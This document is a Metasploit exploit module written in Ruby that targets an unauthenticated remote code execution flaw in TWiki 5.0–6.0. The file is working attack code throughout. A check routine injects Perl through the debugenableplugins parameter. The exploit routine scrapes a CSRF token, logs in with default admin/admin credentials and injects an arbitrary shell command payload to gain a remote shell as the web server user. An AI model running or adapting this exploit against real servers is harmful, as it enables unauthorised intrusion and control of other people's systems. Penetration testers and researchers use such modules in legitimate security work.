##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'digest/md5'

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info={})
    super(update_info(info,
      'Name'           => "TWiki debugenableplugins Unauthenticated Remote Code Execution",
      'Description'    => %q{
      This module exploits a remote code execution vulnerability in TWiki 5.0-6.0
      in order to achieve remote shell or to run arbitrary commands on the system
      as the web server user.
      },
      'License'        => 'ExploitHub',
      'Author'         =>
        [
          'Brandon Perry'
        ],
      'References'     =>
        [
          ['URL', 'http://seclists.org/fulldisclosure/2014/Oct/44']
        ],
      'Arch'            => ARCH_CMD,
      'Version' => '2',
      'Payload' => {
          'BadChars' => "\x20'\"",
      'Compat'          =>
        {
          'PayloadType' => 'cmd'
        }
        },
      'Platform'       => %w{ linux unix },
      'Targets'        => [
          ['TWiki 6.0',
            {
            }
          ]
        ],
      'Privileged'     => false,
      'DisclosureDate' => "Oct 09 2014",
      'DefaultTarget'  => 0))

      register_options(
        [
          OptString.new('TARGETURI', [true, 'The base URI to TWiki', '/']),
          OptString.new('USERNAME',  [false, 'TWiki Username', 'admin']),
          OptString.new('PASSWORD',  [false, 'TWiki Password', 'admin']),
        ], self.class)
  end

  def check
    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, 'do', 'view'),
      'method' => 'POST',
      'data' => 'debugenableplugins=BackupRestorePlugin%3bprint(%22Content-Type:text/html\r\n\r\nVulnerable!%22)%3bexit'
    })

    if res and res.body == "Vulnerable!"
      return Exploit::CheckCode::Vulnerable
    end

    return Exploit::CheckCode::Safe
  end

  def exploit

    cookie = ''
    if datastore['USERNAME'] != ''
      res = send_request_cgi({
        'uri' => normalize_uri(target_uri.path, 'do', 'login')
      })

      res.body =~ /name="crypttoken" value="(.*)" \/><div/
      csrf = $1

      res = send_request_cgi({
        'uri' => normalize_uri(target_uri.path, 'do', 'login'),
        'method' => 'POST',
        'vars_post' => {
          'crypttoken' => csrf,
          'username' => datastore['USERNAME'],
          'password' => datastore['PASSWORD']
        }
      })

      cookie = res.headers['Set-Cookie'] if res.code == 302
    end
    send_request_cgi({
      'uri' => normalize_uri(target_uri.path, 'do', 'view', 'Main', 'WebHome'),
      'method' => 'POST',
      'data' => 'debugenableplugins=BackupRestorePlugin%3bprint(%22Content-Type:text/html\r\n\r\nfdsa%22)%3b`' + payload.encoded.gsub('${IFS}', "\x5c${IFS}") + '`%3bexit',
      'cookie' => cookie
    })
  end
end
